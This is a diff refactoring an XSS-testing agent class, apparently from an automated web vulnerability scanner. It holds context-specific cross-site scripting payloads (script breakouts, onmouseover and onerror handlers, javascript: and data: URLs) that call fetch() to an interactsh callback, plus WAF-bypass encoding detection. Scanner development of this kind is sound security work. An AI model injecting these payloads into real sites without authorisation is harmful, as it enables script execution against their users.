@@ -237,81 +237,92 @@ class XSSAgent(BaseAgent):
         contexts = self._check_contexts(html, probe, escaped_probe)
         return self._prioritize_contexts(contexts)
 
+    def _encode_for_url(self, payload: str) -> str:
+        """URL encode the payload."""
+        from urllib.parse import quote
+        return quote(payload, safe='')
+
+    def _encode_for_html_attribute(self, payload: str) -> str:
+        """HTML entity encode for attribute context."""
+        import html
+        return html.escape(payload, quote=True)
+
+    def _encode_for_js_string(self, payload: str) -> str:
+        """Escape for JavaScript string context."""
+        return payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')
+
+    def _encode_for_script(self, payload: str) -> str:
+        """Escape closing script tags."""
+        return payload.replace("</script>", "<\\/script>")
+
     def prepare_payload(self, payload: str, context: str) -> str:
         """
         TASK-54: Prepare payload with appropriate encoding based on context.
         Ensures payloads are properly encoded to avoid false negatives.
         """
-        import html
-        from urllib.parse import quote
-
         if context in ("url_href", "url_src"):
-            # URL context - URL encode the payload
-            return quote(payload, safe='')
-        elif context == "html_attribute":
-            # HTML attribute context - HTML entity encode
-            return html.escape(payload, quote=True)
-        elif context == "javascript_string":
-            # JS string context - escape quotes and backslashes
-            return payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')
-        elif context == "html_body":
-            # HTML body - minimal encoding, keep < > for tags
-            return payload
-        elif context == "script":
-            # Script context - escape closing script tags
-            return payload.replace("</script>", "<\\/script>")
-        else:
-            # Unknown context - return as-is
-            return payload
+            return self._encode_for_url(payload)
+        if context == "html_attribute":
+            return self._encode_for_html_attribute(payload)
+        if context == "javascript_string":
+            return self._encode_for_js_string(payload)
+        if context == "script":
+            return self._encode_for_script(payload)
+        # html_body or unknown - return as-is
+        return payload
+
+    def _get_context_payload_map(self) -> Dict[str, List[str]]:
+        """Return mapping of contexts to payload templates."""
+        return {
+            "script": [
+                "';fetch('https://{{interactsh_url}}');//",
+                "\";fetch('https://{{interactsh_url}}');//",
+                "`;fetch('https://{{interactsh_url}}');//",
+                "</script><script>fetch('https://{{interactsh_url}}')</script>",
+            ],
+            "javascript_string": [
+                "'-fetch('https://{{interactsh_url}}')-'",
+                "\"-fetch('https://{{interactsh_url}}')-\"",
+                "\\');fetch('https://{{interactsh_url}}');//",
+            ],
+            "html_attribute": [
+                "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
+                "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
+                "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
+            ],
+            "url_context": [
+                "javascript:fetch('https://{{interactsh_url}}')",
+                "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
+            ],
+            "event_handler": [
+                "fetch('https://{{interactsh_url}}')",
+                "';fetch('https://{{interactsh_url}}');//",
+            ],
+            "html_body": [
+                "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
+                "<svg/onload=fetch('https://{{interactsh_url}}')>",
+                "<script>fetch('https://{{interactsh_url}}')</script>",
+            ],
+        }
+
+    def _replace_interactsh_placeholder(self, payloads: List[str], interactsh_url: str) -> List[str]:
+        """Replace interactsh placeholder in all payloads."""
+        return [p.replace("{{interactsh_url}}", interactsh_url) for p in payloads]
 
     def get_payloads_for_context(self, context: str, interactsh_url: str) -> List[str]:
         """
         TASK-54: Get context-specific payloads for more effective testing.
         """
-        base_payloads = []
+        payload_map = self._get_context_payload_map()
 
-        if context == "script":
-            # Payloads to break out of script context
-            base_payloads = [
-                "';fetch('https://{{interactsh_url}}');//",
-                "\";fetch('https://{{interactsh_url}}');//",
-                "`;fetch('https://{{interactsh_url}}');//",
-                "</script><script>fetch('https://{{interactsh_url}}')</script>",
-            ]
-        elif context == "javascript_string":
-            base_payloads = [
-                "'-fetch('https://{{interactsh_url}}')-'",
-                "\"-fetch('https://{{interactsh_url}}')-\"",
-                "\\');fetch('https://{{interactsh_url}}');//",
-            ]
-        elif context == "html_attribute":
-            base_payloads = [
-                "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
-                "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
-                "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
-            ]
-        elif context in ("url_href", "url_src"):
-            base_payloads = [
-                "javascript:fetch('https://{{interactsh_url}}')",
-                "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
-            ]
-        elif context == "event_handler":
-            base_payloads = [
-                "fetch('https://{{interactsh_url}}')",
-                "';fetch('https://{{interactsh_url}}');//",
-            ]
-        elif context == "html_body":
-            base_payloads = [
-                "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
-                "<svg/onload=fetch('https://{{interactsh_url}}')>",
-                "<script>fetch('https://{{interactsh_url}}')</script>",
-            ]
-        else:
-            # Generic payloads for unknown context
-            base_payloads = self.GOLDEN_PAYLOADS[:5]
+        # Map URL contexts to single key
+        if context in ("url_href", "url_src"):
+            context = "url_context"
 
-        # Replace interactsh placeholder
-        return [p.replace("{{interactsh_url}}", interactsh_url) for p in base_payloads]
+        # Get context-specific payloads or fallback to golden set
+        base_payloads = payload_map.get(context, self.GOLDEN_PAYLOADS[:5])
+
+        return self._replace_interactsh_placeholder(base_payloads, interactsh_url)
 
     async def analyze_server_escaping(self, url: str, param: str) -> Dict[str, bool]:
         """
@@ -709,6 +720,22 @@ class XSSAgent(BaseAgent):
             logger.warning(f"[{self.name}] WAF payload optimization failed: {e}")
             return base_payloads
 
+    def _detect_payload_encoding(self, payload: str) -> str:
+        """Detect which encoding technique was used in the payload."""
+        if "%25" in payload:
+            return "double_url_encode"
+        if "\\u00" in payload:
+            return "unicode_encode"
+        if "&#x" in payload:
+            return "html_entity_hex"
+        if "&#" in payload:
+            return "html_entity_encode"
+        if "%00" in payload or "%0" in payload:
+            return "null_byte_injection"
+        if "/**/" in payload:
+            return "comment_injection"
+        return "unknown"
+
     def _record_bypass_result(self, payload: str, success: bool):
         """
         Record bypass result for Q-Learning feedback.
@@ -718,23 +745,7 @@ class XSSAgent(BaseAgent):
             return
 
         try:
-            # Try to determine which encoding was used
-            encoding_used = "unknown"
-
-            # Check for common encoding signatures
-            if "%25" in payload:
-                encoding_used = "double_url_encode"
-            elif "\\u00" in payload:
-                encoding_used = "unicode_encode"
-            elif "&#x" in payload:
-                encoding_used = "html_entity_hex"
-            elif "&#" in payload:
-                encoding_used = "html_entity_encode"
-            elif "%00" in payload or "%0" in payload:
-                encoding_used = "null_byte_injection"
-            elif "/**/" in payload:
-                encoding_used = "comment_injection"
-
+            encoding_used = self._detect_payload_encoding(payload)
             strategy_router.record_result(self._detected_waf, encoding_used, success)
             logger.debug(f"[{self.name}] Recorded bypass: {self._detected_waf}/{encoding_used} = {'SUCCESS' if success else 'FAIL'}")
         except Exception as e:
@@ -1552,32 +1563,38 @@ class XSSAgent(BaseAgent):
 
         if context == "script":
             return self._is_relevant_for_script_context(payload, p_lower)
-        elif context == "html_text":
+        if context == "html_text":
             return any(payload.startswith(x) for x in ["<", "\">", "'>", "{{", "[["])
-        elif context == "attribute_value":
+        if context == "attribute_value":
             return any(p_lower.startswith(x) for x in ["on", "\"", "'", " javascript:", "data:"])
-        elif context == "comment":
+        if context == "comment":
             return "-->" in payload or "--!>" in payload
-        elif context == "style":
+        if context == "style":
             return any(x in payload for x in ["</style>", "expression", "url", "'", "\""])
-        elif context == "tag_name":
+        if context == "tag_name":
             return any(x in payload for x in [" ", ">", "/"])
 
         return False
 
+    def _has_script_breakout_chars(self, payload: str) -> bool:
+        """Check if payload contains script breakout characters."""
+        breakout_chars = ["'", "\"", "</script>", ";", "-", "+", "*", "\\"]
+        return any(x in payload for x in breakout_chars)
+
+    def _is_html_tag_with_breakout(self, payload: str, p_lower: str) -> bool:
+        """Check if HTML tag has proper breakout."""
+        if not payload.startswith("<"):
+            return True  # Not HTML tag, allow
+        if p_lower.startswith("</script>"):
+            return True  # Script closing tag, allow
+        # Check if has quote before tag (breakout)
+        return any(payload.startswith(q) for q in ["'", "\"", "'; ", "\"; "])
+
     def _is_relevant_for_script_context(self, payload: str, p_lower: str) -> bool:
         """Check if payload is relevant for script context."""
-        # Must breakout of JS string or close tag
-        if not any(x in payload for x in ["'", "\"", "</script>", ";", "-", "+", "*", "\\"]):
+        if not self._has_script_breakout_chars(payload):
             return False
-
-        # Exclude pure HTML tags without breakout
-        if payload.startswith("<") and not p_lower.startswith("</script>"):
-            # Re-allow if it has a quote before the tag (breakout)
-            if not any(payload.startswith(q) for q in ["'", "\"", "'; ", "\"; "]):
-                return False
-
-        return True
+        return self._is_html_tag_with_breakout(payload, p_lower)
 
     def _add_safety_net_payloads(self, filtered: List[str], all_payloads: List[str]) -> List[str]:
         """Add top killer payloads as safety net if not already included."""
@@ -2754,46 +2771,59 @@ Return JSON:
         logger.warning("[XSSAgent] Could not generate unique variant")
         return None
 
-    def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
-        """
-        Adapta un payload al contexto HTML detectado.
-        
-        Args:
-            payload: Payload original
-            context: Contexto detectado ('script', 'attribute', 'html', etc.)
-            
-        Returns:
-            Payload adaptado al contexto
-        """
-        # Extraer la parte de ejecución del payload
+    def _extract_js_code(self, payload: str) -> str:
+        """Extract JavaScript execution code from payload."""
         js_code = payload
         js_code = js_code.replace('<script>', '').replace('</script>', '')
         js_code = js_code.replace('<img src=x onerror=', '').replace('>', '')
-        if not js_code:
-            js_code = 'alert(1)'
-        
-        if context == 'attribute':
-            # Estamos dentro de un atributo HTML
-            return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'
-        
-        elif context == 'script':
-            # Estamos dentro de un bloque <script>
-            return f"';{js_code};//"
-        
-        elif context == 'html':
-            # Estamos en HTML normal - usar evento handler
-            return f'<img src=x onerror={js_code}>'
-        
-        elif context == 'comment':
-            # Estamos dentro de un comentario HTML
-            return f'--><script>{js_code}</script><!--'
-        
-        elif context == 'style':
-            # Estamos dentro de un bloque <style>
-            return f'</style><script>{js_code}</script><style>'
-        
-        # Por defecto, devolver un payload seguro
+        return js_code if js_code else 'alert(1)'
+
+    def _adapt_for_attribute(self, js_code: str) -> str:
+        """Adapt for HTML attribute context."""
+        return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'
+
+    def _adapt_for_script(self, js_code: str) -> str:
+        """Adapt for script block context."""
+        return f"';{js_code};//"
+
+    def _adapt_for_html(self, js_code: str) -> str:
+        """Adapt for HTML body context."""
         return f'<img src=x onerror={js_code}>'
+
+    def _adapt_for_comment(self, js_code: str) -> str:
+        """Adapt for HTML comment context."""
+        return f'--><script>{js_code}</script><!--'
+
+    def _adapt_for_style(self, js_code: str) -> str:
+        """Adapt for style block context."""
+        return f'</style><script>{js_code}</script><style>'
+
+    def _adapt_to_context(self, payload: str, context: Optional[str]) -> str:
+        """
+        Adapta un payload al contexto HTML detectado.
+
+        Args:
+            payload: Payload original
+            context: Contexto detectado ('script', 'attribute', 'html', etc.)
+
+        Returns:
+            Payload adaptado al contexto
+        """
+        js_code = self._extract_js_code(payload)
+
+        if context == 'attribute':
+            return self._adapt_for_attribute(js_code)
+        if context == 'script':
+            return self._adapt_for_script(js_code)
+        if context == 'html':
+            return self._adapt_for_html(js_code)
+        if context == 'comment':
+            return self._adapt_for_comment(js_code)
+        if context == 'style':
+            return self._adapt_for_style(js_code)
+
+        # Default: safe payload
+        return self._adapt_for_html(js_code)
 
     def _encode_stripped_chars(self, payload: str, stripped: List[str]) -> str:
         """
